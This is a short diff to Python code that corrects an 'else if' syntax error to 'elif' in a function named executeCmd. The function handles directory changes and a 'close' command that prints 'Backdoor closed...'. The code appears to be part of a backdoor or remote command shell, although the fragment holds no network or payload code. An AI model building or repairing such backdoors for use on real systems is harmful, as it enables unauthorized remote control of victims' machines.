@@ -66,7 +66,7 @@ def executeCmd(cmd):
             os.chdir(os.path.expanduser(cmd[3:]))
         except OSError as e:
             result = str(e)
-    else if cmd[:5] == 'close':
+    elif cmd[:5] == 'close':
         print("Backdoor closed...\n")
         sys.exit(0)
     else:
